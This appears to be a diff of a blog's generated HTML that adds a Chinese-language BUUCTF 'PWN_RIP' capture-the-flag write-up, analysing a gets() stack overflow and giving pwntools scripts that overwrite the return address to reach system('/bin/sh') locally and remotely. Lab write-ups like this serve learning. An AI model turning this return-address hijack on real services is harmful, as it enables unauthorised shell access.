@@ -80,6 +80,99 @@
     <div class="outer">
       <section id="main">
   
+    <article id="post-（BUUCTF）PWN-RIP-write-up" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <h3 href="/2021/12/24/%EF%BC%88BUUCTF%EF%BC%89PWN-RIP-write-up/" class="article-date">
+  <time datetime="2021-12-24T02:43:30.000Z" itemprop="datePublished">2021-12-24</time>
+</h3>
+    
+  </div>
+  <div class="article-inner">
+  <div class="curve-down">
+  <div class="fill-content">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/12/24/%EF%BC%88BUUCTF%EF%BC%89PWN-RIP-write-up/">（BUUCTF）PWN_RIP write_up</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+        <h1 id="0x01-解题过程"><a href="#0x01-解题过程" class="headerlink" title="0x01 解题过程"></a>0x01 解题过程</h1><p>文件拖入kali，file一下，64位动态链接ELF文件</p>
+<p><img src="F:\blog\source\images\1640314073726.png" alt="1640314073726"></p>
+<p>使用checksec或者pwntools看一下保护机制：</p>
+<p><img src="F:\blog\source\images\1640314379493.png" alt="1640314379493"></p>
+<p>用ida分析程序，F5反汇编擦查看一下主函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+1h] [rbp-Fh]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);</span><br><span class="line">  gets(&amp;s, argv);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于栈溢出保护关闭且存在get函数，可以确定本题考点就是栈溢出了。</p>
+<p>查看变量<code>s</code>的构造：</p>
+<p><img src="F:\blog\source\images\1640314493845.png" alt="1640314493845"></p>
+<p>压入<code>0xf+0x8=23</code>个数据即可劫持返回地址。</p>
+<p>还有一个<code>fun</code>函数：</p>
+<p><img src="F:\blog\source\images\1640314772504.png" alt="1640314772504"></p>
+<p>劫持这个fun函数不就可以拿到权限，美滋滋。</p>
+<p>查看fun函数地址：<code>0x401186</code></p>
+<h1 id="0x02-构建EXP"><a href="#0x02-构建EXP" class="headerlink" title="0x02 构建EXP"></a>0x02 构建EXP</h1><p>根据分析的思路，很快，就写好了一个exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line"><span class="comment"># io = remote(IP,port)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">23</span> + p64(<span class="number">0x401186</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这个是测试本地的，运行结果：</p>
+<p><img src="F:\blog\source\images\1640315152160.png" alt="1640315152160"></p>
+<p>可以看到，已经拿到了shell权限。</p>
+<p>于是美滋滋的跑远端…..</p>
+<h1 id="0x03-跳坑"><a href="#0x03-跳坑" class="headerlink" title="0x03 跳坑"></a>0x03 跳坑</h1><p>看到这一段你应该知道，跑远端失败了。</p>
+<p><img src="F:\blog\source\images\1640315327290.png" alt="1640315327290"></p>
+<p>可以拿到shell,但是没有回显。我的第一反应就是，远端环境不对，但是也没有给我什么<code>io</code>文件啊</p>
+<p>研究了很久，没有头绪，去查看网上的exp，拿过来试试也没有用。</p>
+<p>我决定从头试试：</p>
+<p><img src="F:\blog\source\images\1640315506680.png" alt="1640315506680"></p>
+<p>直接报错，按理来说，他的第一步应该是输出才对，跟我的payload根本就没有关系，但是他的第一步是先让我输入，这也就说明，他远端跟给我的文件并不一致，可能顺序反了。再研究研究<code>fun</code>函数</p>
+<p><img src="C:\Users\WDAQ\AppData\Roaming\Typora\typora-user-images\1640315700634.png" alt="1640315700634"></p>
+<p>他会先向<code>rbp</code>中压栈，这就破坏了我的payload，因为我的payload，那么就跳过这段，直接去进行<code>system(&quot;/bin/sh&quot;)</code>就行了。</p>
+<p>可以看到，<code>fun</code>函数中的<code>system(&#39;/bin/sh&#39;)</code>的地址为<code>0x40118A</code></p>
+<p>构建<code>payload</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">23</span> + p64(<span class="number">0x40118A</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(IP,port)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">23</span> + p64(<span class="number">0x40118A</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>运行结果截图：</p>
+<p><img src="F:\blog\source\images\1640316025419.png" alt="1640316025419"></p>
+<blockquote>
+<p>说实话，我其实没搞懂网上的那些EXP为什么那么写，可能是我太菜了。继续加油！继续进步！</p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      <div class="article-footer-content">
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a></li></ul>
+
+        <a data-url="http://example.com/2021/12/24/%EF%BC%88BUUCTF%EF%BC%89PWN-RIP-write-up/" data-id="ckxjtuzwj0000rwvj2fz9fe4b" class="article-share-link">分享到</a>
+        
+      </div>
+    </footer>
+  </div>
+  </div>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-【NISP一级】2-1-密码学基础" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <h3 href="/2021/12/23/%E3%80%90NISP%E4%B8%80%E7%BA%A7%E3%80%912-1-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/" class="article-date">
@@ -882,6 +975,10 @@
       <ul>
         
           <li>
+            <a href="/2021/12/24/%EF%BC%88BUUCTF%EF%BC%89PWN-RIP-write-up/">（BUUCTF）PWN_RIP write_up</a>
+          </li>
+        
+          <li>
             <a href="/2021/12/23/%E3%80%90NISP%E4%B8%80%E7%BA%A7%E3%80%912-1-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/">【NISP一级】2.1 密码学基础</a>
           </li>
         
@@ -897,10 +994,6 @@
             <a href="/2021/12/23/%E3%80%90NISP%E4%B8%80%E7%BA%A7%E3%80%91-1-1%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B8%8E%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/">【NISP一级】 1.1信息安全与网络空间安全</a>
           </li>
         
-          <li>
-            <a href="/2021/12/23/%E3%80%90NISP%E4%B8%80%E7%BA%A7%E3%80%91-1-3%20%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E4%B8%8E%E6%A0%87%E5%87%86/">【NISP一级】1.3 网络空间安全政策与标准</a>
-          </li>
-        
       </ul>
     </div>
   </div>
@@ -910,7 +1003,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">标签</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/NISP/" rel="tag">NISP</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a><span class="tag-list-count">1</span></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/NISP/" rel="tag">NISP</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a><span class="tag-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -919,7 +1012,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a><span class="archive-list-count">7</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a><span class="archive-list-count">8</span></li></ul>
     </div>
   </div>
 
